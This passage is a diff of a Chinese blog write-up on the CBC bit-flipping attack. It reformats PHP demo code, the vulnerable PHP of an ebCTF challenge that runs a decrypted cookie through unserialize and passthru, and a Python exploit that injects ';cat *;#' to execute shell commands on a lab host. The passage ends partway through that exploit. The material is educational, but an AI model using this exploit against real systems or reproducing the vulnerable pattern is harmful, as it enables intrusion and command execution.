@@ -101,31 +101,33 @@ drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使�
 
 <p>下面是相关原理实现的PHP源代码：</p>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_AES_KEY&#39;</span><span class="p">,</span> <span class="s2">&quot;abcdef0123456789&quot;</span><span class="p">);</span>
-<span class="k">function</span> <span class="nf">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$encrypt</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$aes</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_128</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_CBC</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
-    <span class="nv">$iv</span> <span class="o">=</span> <span class="s2">&quot;1234567891234567&quot;</span><span class="p">;</span>
-    <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nx">MY_AES_KEY</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$encrypt</span> <span class="o">?</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_MAC_LEN&#39;</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
-<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">false</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;a:2:{s:4:</span><span class="se">\&quot;</span><span class="s2">name</span><span class="se">\&quot;</span><span class="s2">;s:6:</span><span class="se">\&quot;</span><span class="s2">sdsdsd</span><span class="se">\&quot;</span><span class="s2">;s:8:</span><span class="se">\&quot;</span><span class="s2">greeting</span><span class="se">\&quot;</span><span class="s2">;s:20:</span><span class="se">\&quot;</span><span class="s2">echo &#39;Hello sdsdsd!&#39;</span><span class="se">\&quot;</span><span class="s2">;}&quot;</span><span class="p">;</span>
-<span class="k">echo</span> <span class="s2">&quot;Plaintext before attack: </span><span class="si">$v\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-<span class="nv">$enc</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-<span class="nv">$enc</span> <span class="o">=</span> <span class="o">@</span><span class="nx">encrypt</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
-<span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span>  <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;6&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span> <span class="p">(</span><span class="s2">&quot;7&quot;</span><span class="p">));</span>
-<span class="nv">$b</span> <span class="o">=</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">);</span>
-<span class="k">echo</span> <span class="s2">&quot;Plaintext AFTER attack : </span><span class="si">$b\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div>
+  <pre><code class="php">&lt;?php
+define('MY_AES_KEY', &quot;abcdef0123456789&quot;);
+function aes($data, $encrypt) {
+    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+    $iv = &quot;1234567891234567&quot;;
+    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);
+}
+define('MY_MAC_LEN', 40);
+function encrypt($data) {
+    return aes($data, true);
+}
+function decrypt($data) {
+    $data = rtrim(aes($data, false), &quot;\0&quot;);
+    return $data;
+}
+$v = &quot;a:2:{s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo 'Hello sdsdsd!'\&quot;;}&quot;;
+echo &quot;Plaintext before attack: $v\n&quot;;
+$b = array();
+$enc = array();
+$enc = @encrypt($v);
+$enc[2] =  chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));
+$b = @decrypt($enc);
+echo &quot;Plaintext AFTER attack : $b\n&quot;;
+?&gt;</code></pre>
+</div>
 
 <h1 id="x03-">0x03 一个练习</h1>
 
@@ -146,15 +148,19 @@ drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使�
 
 <p>然后作者构造了一个POST”name”的值来注入字符串：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#a&#39;</span></code></pre></div>
+<div>
+  <pre><code class="python">name = 'X' + ';cat *;#a'</code></pre>
+</div>
 
 <p>首先作者添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，然后<code>;cat *;</code>命令将被执行，最后的<code>#</code>是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。</p>
 
 <p>在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">pos</span> <span class="o">=</span> <span class="mi">51</span><span class="p">;</span>
-<span class="n">val</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">&#39;X&#39;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="n">pos</span><span class="p">]))</span>
-<span class="n">exploit</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span></code></pre></div>
+<div>
+  <pre><code class="python">pos = 51;
+val = chr(ord('X') ^ ord(&quot;'&quot;) ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]</code></pre>
+</div>
 
 <p>然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：
 <img src="http://ojyzyrhpd.bkt.clouddn.com/20150808/pic3.png" alt="pic3" /></p>
@@ -165,7 +171,9 @@ drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使�
 
 <p>我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#&#39;</span> <span class="o">+</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">16</span></code></pre></div>
+<div>
+  <pre><code class="python">name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16</code></pre>
+</div>
 
 <p>在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！</p>
 
@@ -189,142 +197,146 @@ drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使�
   <li>PHP code:</li>
 </ul>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>     
-<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
-<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+<div>
+  <pre><code class="php">&lt;?php     
+ini_set('display_errors',1);
+error_reporting(E_ALL);
  
-<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_AES_KEY&#39;</span><span class="p">,</span> <span class="s2">&quot;abcdef0123456789&quot;</span><span class="p">);</span>
-<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_HMAC_KEY&#39;</span><span class="p">,</span><span class="s2">&quot;1234567890123456&quot;</span> <span class="p">);</span>
-<span class="c1">#define(&quot;FLAG&quot;,&quot;CENSORED&quot;);</span>
+define('MY_AES_KEY', &quot;abcdef0123456789&quot;);
+define('MY_HMAC_KEY',&quot;1234567890123456&quot; );
+#define(&quot;FLAG&quot;,&quot;CENSORED&quot;);
  
-<span class="k">function</span> <span class="nf">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$encrypt</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$aes</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_128</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_CBC</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
-    <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">mcrypt_create_iv</span> <span class="p">(</span><span class="nb">mcrypt_enc_get_iv_size</span><span class="p">(</span><span class="nv">$aes</span><span class="p">),</span> <span class="nx">MCRYPT_RAND</span><span class="p">);</span>
-    <span class="nv">$iv</span> <span class="o">=</span> <span class="s2">&quot;1234567891234567&quot;</span><span class="p">;</span>
-    <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nx">MY_AES_KEY</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$encrypt</span> <span class="o">?</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-<span class="p">}</span>
+function aes($data, $encrypt) {
+    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+    $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);
+    $iv = &quot;1234567891234567&quot;;
+    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+    return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);
+}
  
-<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;MY_MAC_LEN&#39;</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+define('MY_MAC_LEN', 40);
  
-<span class="k">function</span> <span class="nf">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">MY_HMAC_KEY</span><span class="p">);</span>
-<span class="p">}</span>
+function hmac($data) {
+    return hash_hmac('sha1', data, MY_HMAC_KEY);
+}
  
-<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span> <span class="o">.</span> <span class="nx">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
-<span class="p">}</span>
+function encrypt($data) {
+    return aes($data . hmac($data), true);
+}
  
-<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">false</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">);</span>
-    <span class="nv">$mac</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="o">-</span><span class="nx">MY_MAC_LEN</span><span class="p">);</span>
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="nx">MY_MAC_LEN</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nx">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">===</span> <span class="nv">$mac</span> <span class="o">?</span> <span class="nv">$data</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nv">$settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">])</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">]));</span>
-        <span class="nv">$settings</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">])));</span>
-<span class="p">}</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-            <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
-            <span class="s1">&#39;greeting&#39;</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="s1">&#39;echo &#39;</span> <span class="o">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="s2">&quot;Hello </span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">!&quot;</span><span class="p">)),</span>
-    <span class="p">);</span>
-    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;settings&#39;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nx">encrypt</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$settings</span><span class="p">))));</span>
-    <span class="c1">#setcookie(&#39;settings&#39;, serialize($settings));</span>
-<span class="p">}</span>
-<span class="nv">$d</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;greeting&#39;</span><span class="p">])</span> <span class="p">{</span>
-    <span class="nb">passthru</span><span class="p">(</span><span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;greeting&#39;</span><span class="p">]);</span>
-<span class="k">else</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;</span>
-<span class="s2">&lt;form action=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">?</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; method=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">POST\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
- <span class="k">echo</span> <span class="s2">&quot;</span>
-<span class="s2">What is your name?</span>
-<span class="s2"> </span>
-<span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
- <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">text\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">name\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
- <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Submit\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
- <span class="k">echo</span> <span class="s2">&quot;&lt;/form&gt;</span>
-<span class="s2">&lt;pre&gt;</span>
-<span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+function decrypt($data) {
+    $data = rtrim(aes($data, false), &quot;\0&quot;);
+    $mac = substr($data, -MY_MAC_LEN);
+    $data = substr($data, 0, -MY_MAC_LEN);
+    return hmac($data) === $mac ? $data : null;
+}
+$settings = array();
+if (@$_COOKIE['settings']) {
+        echo @decrypt(base64_decode($_COOKIE['settings']));
+        $settings = unserialize(@decrypt(base64_decode($_COOKIE['settings'])));
+}
+if (@$_POST['name'] &amp;&amp; is_string($_POST['name']) &amp;&amp; strlen($_POST['name']) &lt; 200) {
+    $settings = array(
+            'name' =&gt; $_POST['name'],
+            'greeting' =&gt; ('echo ' . escapeshellarg(&quot;Hello {$_POST['name']}!&quot;)),
+    );
+    setcookie('settings', base64_encode(@encrypt(serialize($settings))));
+    #setcookie('settings', serialize($settings));
+}
+$d = array();
+if (@$settings['greeting']) {
+    passthru($settings['greeting']);
+else {
+    echo &quot;&lt;/pre&gt;
+&lt;form action=&quot;\&amp;quot;?\&amp;quot;&quot; method=&quot;\&amp;quot;POST\&amp;quot;&quot;&gt;\n&quot;;
+ echo &quot;
+What is your name?
+ 
+\n&quot;;
+ echo &quot;&lt;input type=&quot;\&amp;quot;text\&amp;quot;&quot; name=&quot;\&amp;quot;name\&amp;quot;&quot; /&gt;\n&quot;;
+ echo &quot;&lt;input type=&quot;\&amp;quot;submit\&amp;quot;&quot; name=&quot;\&amp;quot;submit\&amp;quot;&quot; value=&quot;\&amp;quot;Submit\&amp;quot;&quot; /&gt;\n&quot;;
+ echo &quot;&lt;/form&gt;
+&lt;pre&gt;
+\n&quot;;
+}
+?&gt;</code></pre>
+</div>
 
 <ul>
   <li>Exploit:</li>
 </ul>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">urllib</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span> <span class="k">as</span> <span class="n">dec</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span> <span class="k">as</span> <span class="n">enc</span>
+<div>
+  <pre><code class="python">#!/usr/bin/python
+import requests
+import sys
+import urllib
+from base64 import b64decode as dec
+from base64 import b64encode as enc
  
-<span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://192.168.184.133/ebctf/mine.php&#39;</span>
+url = 'http://192.168.184.133/ebctf/mine.php'
  
-<span class="k">def</span> <span class="nf">Test</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
-    <span class="n">t</span> <span class="o">=</span> <span class="s">&quot;echo &#39;Hello </span><span class="si">%s</span><span class="s">!&#39;&quot;</span> <span class="o">%</span> <span class="n">x</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="s">&#39;a:2:{s:4:&quot;name&quot;;s:</span><span class="si">%s</span><span class="s">:&quot;</span><span class="si">%s</span><span class="s">&quot;;s:8:&quot;greeting&quot;;s:</span><span class="si">%s</span><span class="s">:&quot;</span><span class="si">%s</span><span class="s">&quot;;}</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span><span class="n">x</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">),</span><span class="n">t</span><span class="p">,</span> <span class="s">&#39;X&#39;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="mi">16</span><span class="p">):</span>
-        <span class="k">print</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
-    <span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
+def Test(x):
+    t = &quot;echo 'Hello %s!'&quot; % x
+    s = 'a:2:{s:4:&quot;name&quot;;s:%s:&quot;%s&quot;;s:8:&quot;greeting&quot;;s:%s:&quot;%s&quot;;}%s' % (len(x),x,len(t),t, 'X'*40)
+    for i in xrange(0,len(s),16):
+        print s[i:i+16]
+    print '\n'
  
-<span class="k">def</span> <span class="nf">Pwn</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">global</span> <span class="n">url</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">enc</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
-    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;settings&#39;</span> <span class="p">:</span> <span class="n">s</span><span class="p">})</span><span class="o">.</span><span class="n">content</span>
- <span class="c">#   if req.find(&#39;works&#39;) != -1:</span>
-    <span class="k">print</span> <span class="n">req</span>
-  <span class="c">#  else:</span>
-   <span class="c">#     print &#39;[-] FAIL&#39;</span>
+def Pwn(s):
+    global url
+    s = urllib.quote_plus(enc(s))
+    req = requests.get(url, cookies = {'settings' : s}).content
+ #   if req.find('works') != -1:
+    print req
+  #  else:
+   #     print '[-] FAIL'
  
-<span class="k">def</span> <span class="nf">GetCookie</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
-    <span class="k">global</span> <span class="n">url</span>
-    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s">&#39;name&#39;</span><span class="p">:</span><span class="n">name</span><span class="p">,</span>
-        <span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;Submit&#39;</span>
-    <span class="p">}</span>
-    <span class="n">h</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;Content-Type&#39;</span> <span class="p">:</span> <span class="s">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span>
-    <span class="k">if</span> <span class="n">h</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">&#39;set-cookie&#39;</span><span class="p">):</span>
-        <span class="n">h</span> <span class="o">=</span> <span class="n">dec</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">h</span><span class="p">[</span><span class="s">&#39;set-cookie&#39;</span><span class="p">][</span><span class="mi">9</span><span class="p">:]))</span>
-        <span class="c">#h = urllib.unquote_plus(h[&#39;set-cookie&#39;][9:])</span>
-        <span class="c">#print h</span>
-        <span class="k">return</span> <span class="n">h</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&#39;[-] ERROR&#39;</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+def GetCookie(name):
+    global url
+    d = {
+        'name':name,
+        'submit':'Submit'
+    }
+    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
+    if h.has_key('set-cookie'):
+        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
+        #h = urllib.unquote_plus(h['set-cookie'][9:])
+        #print h
+        return h
+    else:
+        print '[-] ERROR'
+        sys.exit(0)
  
-<span class="c">#a:2:{s:4:&quot;name&quot;;s:10:&quot;X;cat *;#a&quot;;s:8:&quot;greeting&quot;;s:24:&quot;echo &#39;Hello X;cat *;#a!&#39;&quot;;}</span>
-<span class="c">#a:2:{s:4:&quot;name&quot;;</span>
-<span class="c">#s:10:&quot;X;cat *;#a</span>
-<span class="c">#&quot;;s:8:&quot;greeting&quot;</span>
-<span class="c">#;s:24:&quot;echo &#39;Hel</span>
-<span class="c">#lo X;cat *;#a!&#39;&quot;</span>
-<span class="c">#;}</span>
+#a:2:{s:4:&quot;name&quot;;s:10:&quot;X;cat *;#a&quot;;s:8:&quot;greeting&quot;;s:24:&quot;echo 'Hello X;cat *;#a!'&quot;;}
+#a:2:{s:4:&quot;name&quot;;
+#s:10:&quot;X;cat *;#a
+#&quot;;s:8:&quot;greeting&quot;
+#;s:24:&quot;echo 'Hel
+#lo X;cat *;#a!'&quot;
+#;}
  
-<span class="c">#a:2:{s:4:&quot;name&quot;;s:42:&quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&quot;;s:8:&quot;greeting&quot;;s:56:&quot;echo &#39;Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!&#39;&quot;;}</span>
-<span class="c">#a:2:{s:4:&quot;name&quot;;</span>
-<span class="c">#s:42:&quot;zzzzzzzzzz</span>
-<span class="c">#zzzzzzzX;cat *;#</span>
-<span class="c">#zzzzzzzzzzzzzzzz</span>
-<span class="c">#&quot;;s:8:&quot;greeting&quot;</span>
-<span class="c">#;s:56:&quot;echo &#39;Hel</span>
-<span class="c">#lo zzzzzzzzzzzzz</span>
-<span class="c">#zzzzX;cat *;#zzz</span>
-<span class="c">#zzzzzzzzzzzzz!&#39;&quot;</span>
-<span class="c">#;}</span>
-<span class="c">#exploit = &#39;X&#39; + &#39;;cat *;#a&#39; #Test case first, unsuccess</span>
-<span class="n">exploit</span> <span class="o">=</span> <span class="s">&#39;z&#39;</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="s">&#39;X&#39;</span> <span class="o">+</span> <span class="s">&#39;;cat *;#&#39;</span> <span class="o">+</span> <span class="s">&#39;z&#39;</span> <span class="o">*</span><span class="mi">16</span> <span class="c"># Test Success</span>
